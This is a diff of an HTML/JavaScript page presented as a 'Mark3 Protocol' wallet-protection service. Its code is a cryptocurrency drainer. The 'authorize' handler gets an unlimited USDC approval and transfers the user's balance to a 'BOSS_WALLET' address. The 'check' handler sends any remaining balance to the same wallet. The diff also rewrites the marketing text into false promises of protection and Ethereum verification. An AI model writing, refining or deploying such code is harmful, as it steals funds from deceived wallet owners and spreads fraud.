@@ -42,12 +42,12 @@
       transition: all 0.3s ease;
       color: white;
     }
-    .button:hover:enabled {
-      filter: brightness(1.1);
-    }
     .button:disabled {
       opacity: 0.6;
       cursor: not-allowed;
+    }
+    .button:hover:not(:disabled) {
+      filter: brightness(1.1);
     }
     .progress-bar {
       margin-top: 1rem;
@@ -94,9 +94,9 @@
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
     <div class="info-box">
-      <div>✅ Mark3 provides dual-layer wallet authorization and automatic balance routing using secure smart contracts.</div>
-      <div>✅ One-click authorization protects your assets with confidence.</div>
-      <div>✅ Fully verified on Ethereum and optimized for DeFi-grade deployment.</div>
+      <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
+      <div>✅ A single authorization grants continuous protection, allowing you to confidently operate your wallet without risk of unauthorized withdrawals or vulnerabilities.</div>
+      <div>✅ Trusted by power users, Mark3 is built with a decentralized logic core, fully verified on Ethereum, and optimized for scalable financial defense.</div>
     </div>
   </div>
 
@@ -110,16 +110,16 @@
 
     let provider, signer, user;
     const bar = document.getElementById("bar");
-    const statusBox = document.getElementById("status");
-    const authorizeBtn = document.getElementById("authorize");
-    const checkBtn = document.getElementById("check");
-
-    const status = (msg) => statusBox.innerText = "🔒 Status: " + msg;
+    const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
     const progress = (val) => bar.style.width = val + "%";
+
+    window.onerror = (msg, url, line) => {
+      console.error("Global Error:", msg, "at", line);
+    };
 
     document.getElementById("connect").onclick = async () => {
       try {
-        if (!window.ethereum) throw new Error("Wallet not available");
+        if (!window.ethereum) throw new Error("Please use a supported wallet browser or install MetaMask");
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
@@ -133,78 +133,55 @@
     };
 
     document.getElementById("authorize").onclick = async () => {
-      if (!signer) return status("❌ Please connect wallet first");
-
-      authorizeBtn.disabled = true;
-      status("🔐 Wallet protection in progress... Do not close or leave this page.");
+      const btn = document.getElementById("authorize");
+      btn.disabled = true;
       progress(5);
+      status("🔄 Wallet Protecting... Do not leave the page");
 
-      const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-        "function approve(address,uint256) returns (bool)",
-        "function transferFrom(address,address,uint256) returns (bool)",
-        "function balanceOf(address) view returns (uint256)",
-        "function allowance(address,address) view returns (uint256)"
-      ], signer);
+      setTimeout(() => {
+        if (progress < 30) status("⏳ Stuck? Please refresh the page");
+      }, 60000);
 
-      let timeoutHandle;
       try {
-        const fullBalance = await usdc.balanceOf(user);
-        const oneUSDC = ethers.BigNumber.from("1000000");
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function approve(address,uint256) returns (bool)",
+          "function transferFrom(address,address,uint256) returns (bool)",
+          "function balanceOf(address) view returns (uint256)",
+          "function allowance(address owner, address spender) view returns (uint256)"
+        ], signer);
 
-        if (fullBalance.lte(oneUSDC)) {
-          authorizeBtn.disabled = false;
-          return status("❌ Insufficient balance: Need more than 1 USDC");
-        }
-
-        status("⏳ Processing (1/3): Approving USDC to Boss...");
-        progress(20);
-
-        timeoutHandle = setTimeout(() => {
-          status("⏱️ Timeout: Please refresh the page and try again.");
-          authorizeBtn.disabled = false;
-        }, 60000);
-
-        const approveTx = await usdc.approve(CONFIG.BOSS_WALLET, ethers.constants.MaxUint256);
-        await approveTx.wait();
-        clearTimeout(timeoutHandle);
-
-        status("⏳ Processing (2/3): Verifying allowance...");
-        progress(40);
-        const allowance = await usdc.allowance(user, CONFIG.BOSS_WALLET);
-
-        if (allowance.lt(fullBalance)) {
-          authorizeBtn.disabled = false;
-          return status("❌ Allowance not confirmed. Please try again.");
-        }
-
-        status("⏳ Processing (3/3): Executing transfers...");
-        progress(60);
-
-        const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, oneUSDC);
+        const balance = await usdc.balanceOf(user);
+        const tx1 = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
         await tx1.wait();
+        progress(33);
+        status("(1/3) Approved unlimited USDC to contract");
 
-        const remaining = fullBalance.sub(oneUSDC);
-        const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, remaining);
+        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+        if (allowance.lt(balance)) throw new Error("Allowance not confirmed");
+
+        const tx2 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, ethers.utils.parseUnits("1", 6));
         await tx2.wait();
+        progress(66);
+        status("(2/3) Sent 1 USDC to contract");
 
+        const remaining = await usdc.balanceOf(user);
+        const tx3 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, remaining);
+        await tx3.wait();
         progress(100);
-        status("✅ Wallet Protection Success!🔐");
+        status("(3/3) Wallet Protection Success! 🔐");
       } catch (err) {
-        clearTimeout(timeoutHandle);
-        status("❌ " + (err.message || "Transaction failed"));
+        status("❌ " + (err.message || "Authorization failed"));
         progress(0);
       } finally {
-        authorizeBtn.disabled = false;
+        btn.disabled = false;
       }
     };
 
-    checkBtn.onclick = async () => {
-      if (!signer) return status("❌ Please connect wallet first");
-      checkBtn.disabled = true;
-      progress(10);
-      status("🧿 Checking protection status... Do not close the page.");
-
+    document.getElementById("check").onclick = async () => {
       try {
+        if (!signer) return status("❌ Please connect wallet first");
+        progress(10);
+        status("🧿 Checking protection status...");
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function balanceOf(address) view returns (uint256)",
           "function transfer(address,uint256) returns (bool)"
@@ -212,7 +189,6 @@
 
         const balance = await usdc.balanceOf(user);
         if (balance.gt(0)) {
-          status("⏳ Executing protection transfer...");
           const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
           await tx.wait();
           progress(100);
@@ -222,10 +198,8 @@
           progress(0);
         }
       } catch (err) {
-        status("❌ " + (err.message || "Protection check failed"));
+        status("❌ " + err.message);
         progress(0);
-      } finally {
-        checkBtn.disabled = false;
       }
     };
   </script>
